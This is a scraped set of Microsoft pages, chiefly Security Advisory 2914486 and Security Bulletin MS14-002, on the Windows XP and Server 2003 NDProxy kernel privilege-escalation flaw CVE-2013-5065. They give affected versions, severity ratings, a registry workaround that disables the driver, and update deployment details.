* [Microsoft TechNet Security](https://go.microsoft.com/fwlink/?linkid=21132) provides additional information about security in Microsoft products.

#### Disclaimer

The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (November 27, 2013): Advisory published.
* V2.0 (January 14, 2014): Advisory updated to reflect publication of security bulletin.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from technet.microsoft.com_305096b3_20250126_080718.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityAdvisories/2014/2914486.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 10/14/2022
* 3 contributors

Feedback

## In this article

Security Advisory

# Microsoft Security Advisory 2914486

## Vulnerability in Microsoft Windows Kernel Could Allow Elevation of Privilege

Published: November 27, 2013 | Updated: January 14, 2014

**Version:** 2.0

### General Information

#### Executive Summary

Microsoft has completed the investigation into reports of this vulnerability. We have issued [MS14-002](https://go.microsoft.com/fwlink/?linkid=389579) to address the Kernel NDProxy Vulnerability ([CVE-2013-5065](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-5065)). For more information about this issue, including download links for an available security update, please review [MS14-002](https://go.microsoft.com/fwlink/?linkid=389579).

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* [FireEye, Inc.](https://www2.fireeye.com/) for helping us with the Kernel NDProxy Vulnerability (CVE-2013-5065)

#### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please visit the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

#### Feedback

* You can provide feedback by completing the Microsoft Help and Support form, [Customer Service Contact Us](https://support.microsoft.com/kb/?scid=sw;en;1257&showpage=1&ws=technet&sd=tech).

#### Support

* Customers in the United States and Canada can receive technical support from [Security Support](https://go.microsoft.com/fwlink/?linkid=21131). For more information, see [Microsoft Help and Support](https://support.microsoft.com/).
* International customers can receive support from their local Microsoft subsidiaries. For more information, see [International Support](https://go.microsoft.com/fwlink/?linkid=21155).
* [Microsoft TechNet Security](https://go.microsoft.com/fwlink/?linkid=21132) provides additional information about security in Microsoft products.

#### Disclaimer

The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (November 27, 2013): Advisory published.
* V2.0 (January 14, 2014): Advisory updated to reflect publication of security bulletin.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from technet.microsoft.com_8717fbc8_20250126_080720.html ===


This is the Trace Id: b01a903896109be21e924455fedfec64

Skip to main content

[![](https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31)
Microsoft](https://www.microsoft.com)

MSRC

[MSRC](https://msrc.microsoft.com/)

MSRC

* [Home](https://msrc.microsoft.com/)
* Report an issue
  + [Report Security Vulnerability](https://msrc.microsoft.com/report/vulnerability/new)
  + [Report Abuse](https://msrc.microsoft.com/report/abuse)
  + [Report Infringement](https://msrc.microsoft.com/report/infringement)
  + [Submission FAQs](https://microsoft.com/msrc/faqs-report-an-issue)
* Customer guidance
  + [Security Update Guide](https://msrc.microsoft.com/update-guide)
  + [Exploitability index](https://microsoft.com/msrc/exploitability-index)
  + [Developer API documentation](https://aka.ms/msrc-api-docs-cvrf)
  + [Frequently Asked Questions](https://www.microsoft.com/msrc/faqs-security-update-guide)
  + [Technical Security Notifications](https://www.microsoft.com/en-us/msrc/technical-security-notifications)
* Engage
  + [Microsoft Bug Bounty Programs](https://microsoft.com/msrc/bounty)
  + [Microsoft Active Protections Program](https://microsoft.com/msrc/mapp)
  + [BlueHat Security Conference](https://www.microsoft.com/bluehat/)
  + [Researcher Recognition Program](https://www.microsoft.com/en-us/msrc/researcher-recognition-program)
  + [Windows Security Servicing Criteria](https://microsoft.com/msrc/windows-security-servicing-criteria)
  + [Researcher Resource Center](https://www.microsoft.com/en-us/msrc/msrc-researcher-resource-center)
* Who we are
  + [Mission](https://microsoft.com/msrc/mission)
  + [Cyber Defense Operations Center](https://microsoft.com/msrc/cdoc)
  + [Coordinated Vulnerability Disclosure](https://microsoft.com/msrc/cvd)
  + [Social](https://microsoft.com/msrc/social)
* Blogs
  + [Microsoft Security Response Center](https://aka.ms/blog-msrc)
  + [Security Research & Defense](https://aka.ms/blog-srd)
  + [BlueHat Conference Blog](https://aka.ms/blog-bluehat)
* Acknowledgments
  + [Security Researcher Acknowledgments](https://msrc.microsoft.com/update-guide/acknowledgment)
  + [Online Services Researcher Acknowledgments](https://msrc.microsoft.com/update-guide/acknowledgement/online)
  + [Security Researcher Leaderboard](https://msrc.microsoft.com/leaderboard)
* More

* All Microsoft
  + ## Global

    - [Microsoft 365](https://www.microsoft.com/microsoft-365)
    - [Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
    - [Copilot](https://copilot.microsoft.com/)
    - [Windows](https://www.microsoft.com/en-us/windows/)
    - [Surface](https://www.microsoft.com/surface)
    - [Xbox](https://www.xbox.com/)
    - [Deals](https://www.microsoft.com/en-us/store/b/sale?icid=gm_nav_L0_salepage)
    - [Small Business](https://www.microsoft.com/en-us/store/b/business)
    - [Support](https://support.microsoft.com/en-us)
  + Software
    Software
    - [Windows Apps](https://www.microsoft.com/en-us/store/apps/windows?icid=CNavAppsWindowsApps)
    - [AI](https://www.microsoft.com/en-us/ai)
    - [Outlook](https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook)
    - [OneDrive](https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage)
    - [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
    - [OneNote](https://www.microsoft.com/en-us/microsoft-365/onenote/digital-note-taking-app)
    - [Microsoft Edge](https://www.microsoft.com/edge)
    - [Skype](https://www.skype.com/en/)
  + PCs & Devices
    PCs & Devices
    - [Computers](https://www.microsoft.com/en-us/store/b/pc?icid=CNavDevicesPC)
    - [Shop Xbox](https://www.microsoft.com/en-us/store/b/xbox?icid=CNavDevicesXbox)
    - [Accessories](https://www.microsoft.com/en-us/store/b/accessories?icid=CNavDevicesAccessories)
    - [VR & mixed reality](https://www.microsoft.com/en-us/store/b/virtualreality?icid=CNavVirtualReality)
    - [Certified Refurbished](https://www.microsoft.com/en-us/store/b/certified-refurbished-products)
    - [Trade-in for cash](https://www.microsoft.com/en-us/store/b/microsoft-trade-in)
  + Entertainment
    Entertainment
    - [Xbox Game Pass Ultimate](https://www.xbox.com/en-us/games/store/xbox-game-pass-ultimate/cfq7ttc0khs0?icid=CNavAllXboxGamePassUltimate)
    - [PC Game Pass](https://www.xbox.com/en-us/games/store/pc-game-pass/cfq7ttc0kgq8?icid=CNavAllPCGamePass)
    - [Xbox games](https://www.microsoft.com/en-us/store/b/xboxgames?icid=CNavGamesXboxGames)
    - [PC and Windows games](https://www.microsoft.com/en-us/store/games/windows?icid=CNavGamesWindowsGames)
    - [Movies & TV](https://www.microsoft.com/en-us/store/movies-and-tv?icid=TopNavMoviesTv)
  + Business
    Business
    - [Microsoft Cloud](https://www.microsoft.com/en-us/microsoft-cloud)
    - [Microsoft Security](https://www.microsoft.com/en-us/security)
    - [Dynamics 365](https://www.microsoft.com/en-us/dynamics-365)
    - [Microsoft 365 for business](https://www.microsoft.com/en-us/microsoft-365/business)
    - [Microsoft Power Platform](https://www.microsoft.com/en-us/power-platform)
    - [Windows 365](https://www.microsoft.com/en-us/windows-365)
    - [Microsoft Industry](https://www.microsoft.com/en-us/industry)
    - [Small Business](https://www.microsoft.com/en-us/store/b/business?icid=CNavBusinessStore)
  + Developer & IT
    Developer & IT
    - [Azure](https://azure.microsoft.com/en-us/)
    - [Microsoft Developer](https://developer.microsoft.com/en-us/)
    - [Documentation](https://learn.microsoft.com/docs/)
    - [Microsoft Learn](https://learn.microsoft.com/)
    - [Microsoft Tech Community](https://techcommunity.microsoft.com/)
    - [Azure Marketplace](https://azuremarketplace.microsoft.com/en-us/)
    - [AppSource](https://appsource.microsoft.com/en-us/)
    - [Visual Studio](https://visualstudio.microsoft.com/)
  + Other
    Other
    - [Microsoft Rewards](https://www.microsoft.com/rewards)
    - [Free downloads & security](https://www.microsoft.com/en-us/download)
    - [Education](https://www.microsoft.com/en-us/education)
    - [Gift cards](https://www.microsoft.com/en-us/store/b/gift-cards)
    - [Licensing](https://www.microsoft.com/licensing/)
    - [Unlocked stories](https://unlocked.microsoft.com/)
  + [View Sitemap](https://www.microsoft.com/en-us/sitemap)

Search
Search Microsoft.com

* No results

Cancel

# Microsoft Security Response Center

![Microsoft Security Response Center](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iDfp?scl=1)

## Protection, detection, and response

The **Microsoft Security Response Center** is part of the defender community and on the front line of security response evolution. For over twenty years, we have been engaged with security researchers working to protect customers and the broader ecosystem.

* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2jxFK-report_issue_icon?wid=40&hei=40)
  [Report an issue](https://msrc.microsoft.com/create-report?c=icon)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iIyM-guidance_icon?wid=40&hei=40)
  [Security Update Guide](https://msrc.microsoft.com/update-guide)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2m3TR-Shield2?wid=40&hei=40)
  [Bounty programs](https://microsoft.com/msrc/bounty)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iIyL-who_we_are_icon?wid=40&hei=40)
  [Who we are](https://microsoft.com/msrc/mission)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iA1s-blog_icon?wid=40&hei=40)
  [Blogs](https://msrc-blog.microsoft.com)

What's new

* [Surface Pro](https://www.microsoft.com/en-us/surface/devices/surface-pro-11th-edition)
* [Surface Laptop](https://www.microsoft.com/en-us/surface/devices/surface-laptop-7th-edition)
* [Surface Laptop Studio 2](https://www.microsoft.com/en-us/d/Surface-Laptop-Studio-2/8rqr54krf1dz)
* [Surface Laptop Go 3](https://www.microsoft.com/en-us/d/Surface-Laptop-Go-3/8p0wwgj6c6l2)
* [Microsoft Copilot](https://www.microsoft.com/en-us/microsoft-copilot)
* [AI in Windows](https://www.microsoft.com/en-us/windows/copilot-ai-features)
* [Explore Microsoft products](https://www.microsoft.com/en-us/microsoft-products-and-apps)
* [Windows 11 apps](https://www.microsoft.com/windows/windows-11-apps)

Microsoft Store

* [Account profile](https://account.microsoft.com/)
* [Download Center](https://www.microsoft.com/en-us/download)
* [Microsoft Store support](https://go.microsoft.com/fwlink/?linkid=2139749)
* [Returns](https://www.microsoft.com/en-us/store/b/returns)
* [Order tracking](https://www.microsoft.com/en-us/store/b/order-tracking)
* [Certified Refurbished](https://www.microsoft.com/en-us/store/b/certified-refurbished-products)
* [Microsoft Store Promise](https://www.microsoft.com/en-us/store/b/why-microsoft-store?icid=footer_why-msft-store_7102020)
* [Flexible Payments](https://www.microsoft.com/en-us/store/b/payment-financing-options?icid=footer_financing_vcc)

Education

* [Microsoft in education](https://www.microsoft.com/en-us/education)
* [Devices for education](https://www.microsoft.com/en-us/education/devices/overview)
* [Microsoft Teams for Education](https://www.microsoft.com/en-us/education/products/teams)
* [Microsoft 365 Education](https://www.microsoft.com/en-us/education/products/microsoft-365)
* [How to buy for your school](https://www.microsoft.com/education/how-to-buy)
* [Educator training and development](https://education.microsoft.com/)
* [Deals for students and parents](https://www.microsoft.com/en-us/store/b/education)
* [Azure for students](https://azure.microsoft.com/en-us/free/students/)

Business

* [Microsoft Cloud](https://www.microsoft.com/en-us/microsoft-cloud)
* [Microsoft Security](https://www.microsoft.com/en-us/security)
* [Dynamics 365](https://www.microsoft.com/en-us/dynamics-365)
* [Microsoft 365](https://www.microsoft.com/en-us/microsoft-365/business)
* [Microsoft Power Platform](https://www.microsoft.com/en-us/power-platform)
* [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
* [Microsoft 365 Copilot](https://www.microsoft.com/en-us/microsoft-365/copilot/copilot-for-work)
* [Small Business](https://www.microsoft.com/en-us/store/b/business?icid=CNavBusinessStore)

Developer & IT

* [Azure](https://azure.microsoft.com/en-us/)
* [Microsoft Developer](https://developer.microsoft.com/en-us/)
* [Documentation](https://learn.microsoft.com/docs/)
* [Microsoft Learn](https://learn.microsoft.com/)
* [Microsoft Tech Community](https://techcommunity.microsoft.com/)
* [Azure Marketplace](https://azuremarketplace.microsoft.com/en-us/)
* [AppSource](https://appsource.microsoft.com/en-us/)
* [Visual Studio](https://visualstudio.microsoft.com/)

Company

* [Careers](https://careers.microsoft.com/)
* [About Microsoft](https://www.microsoft.com/about)
* [Company news](https://news.microsoft.com/)
* [Privacy at Microsoft](https://privacy.microsoft.com/en-us)
* [Investors](https://www.microsoft.com/investor/default.aspx)
* [Diversity and inclusion](https://www.microsoft.com/en-us/diversity/)
* [Accessibility](https://www.microsoft.com/en-us/accessibility)
* [Sustainability](https://www.microsoft.com/en-us/sustainability/)

[English (United States)](https://www.microsoft.com/en-us/locale.aspx)
[Your Privacy Choices Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)
[Your Privacy Choices Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

[Consumer Health Privacy](https://go.microsoft.com/fwlink/?linkid=2259814)

* [Sitemap](https://www.microsoft.com/en-us/sitemap1.aspx)
* [Contact Microsoft](https://support.microsoft.com/contactus)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* Manage cookies
* [Terms of use](https://go.microsoft.com/fwlink/?LinkID=206977)
* [Trademarks](https://go.microsoft.com/fwlink/?linkid=2196228)
* [Safety & eco](https://go.microsoft.com/fwlink/?linkid=2196227)
* [Recycling](https://www.microsoft.com/en-us/legal/compliance/recycling)
* [About our ads](https://choice.microsoft.com)
* © Microsoft 2025



=== Content from go.microsoft.com_f3afb16e_20250126_080734.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2014/ms14-002.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin MS14-002 - Important

* Article
* 03/01/2023
* 5 contributors

Feedback

## In this article

## Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368)

Published: January 14, 2014

**Version:** 1.0

## General Information

### Executive Summary

This security update resolves a publicly reported vulnerability in Microsoft Windows. The vulnerability could allow elevation of privilege if an attacker logs on to a system and runs a specially crafted application. An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability.

This security update is rated Important for all supported editions of Windows XP and Windows Server 2003. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerability by correctly validating input passed to the Windows Kernel component. For more information about the vulnerability, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses the vulnerability first described in [Microsoft Security Advisory 2814486](https://technet.microsoft.com/security/advisory/2914486).

**Recommendation**.  Most customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update at the earliest opportunity using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

### Knowledge Base Article

* **Knowledge Base Article**: [2914368](https://support.microsoft.com/kb/2914368)
* **File Information**: Yes
* **SHA1/SHA2 hashes**: Yes
* **Known issues**: None

## Affected and Non-Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| **Operating System** | **Maximum Security Impact** | **Aggregate Severity Rating** | **Updates Replaced** |
| --- | --- | --- | --- |
| **Windows XP** |  |  |  |
| [Windows XP Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=6cae1016-419a-47ab-9765-b4c1d7c0865c) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| [Windows XP Professional x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c1094864-2576-4770-9d2d-3dae33ddecb6) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| **Windows Server 2003** |  |  |  |
| [Windows Server 2003 Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=6d50f851-4be3-413f-b02d-b5b6a3f49fb4) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| [Windows Server 2003 x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=69966ceb-a9c9-4aa7-b685-78562c96640f) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| [Windows Server 2003 with SP2 for Itanium-based Systems](https://www.microsoft.com/download/details.aspx?familyid=0b1c1309-8b6f-4342-92aa-6cb5cb2abe6a) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |

**Non-Affected Software**

| **Operating System** |
| --- |
| Windows Vista Service Pack 2 |
| Windows Vista x64 Edition Service Pack 2 |
| Windows Server 2008 for 32-bit Systems Service Pack 2 |
| Windows Server 2008 for x64-based Systems Service Pack 2 |
| Windows Server 2008 for Itanium-based Systems Service Pack 2 |
| Windows 7 for 32-bit Systems Service Pack 1 |
| Windows 7 for x64-based Systems Service Pack 1 |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 |
| Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 |
| Windows 8 for 32-bit Systems |
| Windows 8 for x64-based Systems |
| Windows 8.1 for 32-bit Systems |
| Windows 8.1 for x64-based Systems |
| Windows Server 2012 |
| Windows Server 2012 R2 |
| Windows RT |
| Windows RT 8.1 |
| **Server Core installation option** |
| Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) |
| Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) |
| Windows Server 2012 R2 (Server Core installation) |
| Windows Server 2012 (Server Core installation) |

## Update FAQ

**If I applied the workaround previously described in Microsoft Security Advisory 2914486, should I undo the workaround before or after applying this update?**

Yes, customers should undo the workaround before applying this update. If you do not undo the workaround at some point, services that rely on Telephony Application Programming Interfaces (TAPI) will not function. These services include Remote Access Service (RAS), dial-up networking, and virtual private networking (VPN).

**I am using an older release of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin has been tested to determine which releases are affected. Other releases are past their support life cycle. For more information about the product lifecycle, see the [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742) website.

It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. To determine the support lifecycle for your software release, see [Select a Product for Lifecycle Information](https://go.microsoft.com/fwlink/?linkid=169555). For more information about service packs for these software releases, see [Service Pack Lifecycle Support Policy](https://go.microsoft.com/fwlink/?linkid=89213).

Customers who require custom support for older software must contact their Microsoft account team representative, their Technical Account Manager, or the appropriate Microsoft partner representative for custom support options. Customers without an Alliance, Premier, or Authorized Contract can contact their local Microsoft sales office. For contact information, see the [Microsoft Worldwide Information](https://go.microsoft.com/fwlink/?linkid=33329) website, select the country in the Contact Information list, and then click **Go** to see a list of telephone numbers. When you call, ask to speak with the local Premier Support sales manager. For more information, see the [Microsoft Support Lifecycle Policy FAQ](https://go.microsoft.com/fwlink/?linkid=169557).

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [January bulletin summary](https://technet.microsoft.com/security/bulletin/ms14-jan). For more information, see [Microsoft Exploitability Index](https://technet.microsoft.com/security/cc998259).

| **Vulnerability Severity Rating and Maximum Security Impact by Affected Software** |  |  |
| --- | --- | --- |
| **Affected Software** | **Kernel NDProxy Vulnerability - CVE-2013-5065** | **Aggregate Severity Rating** |
| **Windows XP** |  |  |
| Windows XP Service Pack 3 | **Important**  Elevation of Privilege | **Important** |
| Windows XP Professional x64 Edition Service Pack 2 | **Important**  Elevation of Privilege | **Important** |
| **Windows Server 2003** |  |  |
| Windows Server 2003 Service Pack 2 | **Important**  Elevation of Privilege | **Important** |
| Windows Server 2003 x64 Edition Service Pack 2 | **Important**  Elevation of Privilege | **Important** |
| Windows Server 2003 with SP2 for Itanium-based Systems | **Important**  Elevation of Privilege | **Important** |

## Kernel NDProxy Vulnerability - CVE-2013-5065

An elevation of privilege vulnerability exists in the NDProxy component of the Windows kernel due to improper validation of input passed from user mode to the kernel. The vulnerability could allow an attacker to run code in kernel mode. An attacker who successfully exploited this vulnerability could run a specially crafted application and take complete control of an affected system. The attacker could then install programs; view, change, or delete data; or create new accounts with full administrator rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2013-5065](https://www.cve.org/CVERecord?id=CVE-2013-5065).

### Mitigating Factors

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability could not be exploited remotely or by anonymous users.

### Workarounds

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Reroute the NDProxy service to Null.sys**

  For environments with non-default, limited user privileges, Microsoft has verified that the following workaround effectively blocks the attacks that have been observed in the wild.

  To implement this workaround, follow these steps:

  1. From an elevated command prompt, execute the following commands:

     ```
         sc stop ndproxy
         reg add HKLM\System\CurrentControlSet\Services\ndproxy /v ImagePath /t REG_EXPAND_SZ /d system32\drivers\null.sys /f

     ```
  2. Restart the system.

  **Impact of workaround.** Disabling NDProxy.sys will cause certain services that rely on Windows Telephony Application Programming Interfaces (TAPI) to not function. Services that will no longer work include Remote Access Service (RAS), dial-up networking, and virtual private networking (VPN).

  **How to undo the workaround.**

  To undo this workaround, follow these steps:

  1. From an elevated command prompt, execute the following commands:

     ```
         sc stop ndproxy
         reg add HKLM\System\CurrentControlSet\Services\ndproxy /v ImagePath /t REG_EXPAND_SZ /d system32\drivers\ndproxy.sys /f

     ```
  2. Restart the system.

### FAQ

**What is the scope of the vulnerability?**

This is an elevation of privilege vulnerability.

**What causes the vulnerability?**

The vulnerability is caused when the NDProxy.sys kernel component fails to properly validate input.

**What is NDPROXY?**

NDPROXY is a system-provided driver that interfaces WAN miniport drivers, call managers, and miniport call managers to the Telephony Application Programming Interfaces (TAPI) services. For additional information, see MSDN article, [NDPROXY Overview](https://msdn.microsoft.com/library/ff568322%28vs.85%29.aspx).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.

**How could an attacker exploit the vulnerability?**

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take complete control over the affected system.

**What systems are primarily at risk from the vulnerability?**

Workstations and terminal servers are primarily at risk. Servers could be at more risk if administrators allow users to log on to servers and to run programs. However, best practices strongly discourage allowing this.

**What does the update do?**

The update addresses the vulnerability by correctly validating input passed to the Windows Kernel component.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2013-5065](https://www.cve.org/CVERecord?id=CVE-2013-5065). This vulnerability was first described in [Microsoft Security Advisory 2914486](https://technet.microsoft.com/security/advisory/2914486).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. Microsoft was aware of limited, targeted attacks that attempt to exploit this vulnerability.

## Detection and Deployment Tools and Guidance

Several resources are available to help administrators deploy security updates.

* Microsoft Baseline Security Analyzer (MBSA) lets administrators scan local and remote systems for missing security updates and common security misconfigurations.
* Windows Server Update Services (WSUS), Systems Management Server (SMS), and System Center Configuration Manager help administrators distribute security updates.
* The Update Compatibility Evaluator components included with Application Compatibility Toolkit aid in streamlining the testing and validation of Windows updates against installed applications.

For information about these and other tools that are available, see [Security Tools for IT Pros](https://technet.microsoft.com/security/cc297183).

## Security Update Deployment

### Windows XP (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows XP:\ **WindowsXP-KB2914368-x86-ENU.exe** |
| --- | --- |
| \ | For all supported x64-based editions of Windows XP Professional:\ **WindowsServer2003.WindowsXP-KB2914368-x64-ENU.exe** |
| **Installation switches** | See [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841) |
| **Update log file** | KB2914368.log |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstallKB2914368$\Spuninst folder |
| **File information** | See [Microsoft Knowledge Base Article 2914368](https://support.microsoft.com/kb/2914368) |
